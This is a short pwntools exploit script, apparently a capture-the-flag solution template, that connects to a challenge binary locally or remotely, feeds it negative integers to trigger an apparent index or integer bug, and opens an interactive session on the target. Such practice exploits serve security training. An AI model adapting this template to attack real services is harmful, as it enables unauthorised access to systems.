#!/bin/python3

from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chall"        ### CHANGE ME !!!!!!!!!!!!!!!!
alloc_counter = 0

gdbscript = '''
'''
def init():
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) > 8):
        return u64(ptr[0:8])
    return u64(ptr + (b"\x00" * (8 - len(ptr)))  )

def exploit():
    log.info("x")
    pp.recvuntil(b": ")
    pp.sendline(b"-3")
    pp.recvuntil(b": ")
    pp.sendline(b"-10")
    pp.recvuntil(b": ")
    pp.sendline(b"1")
    pp.recvuntil(b": ")
    pp.sendline(b"1")
    pp.interactive()
        

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
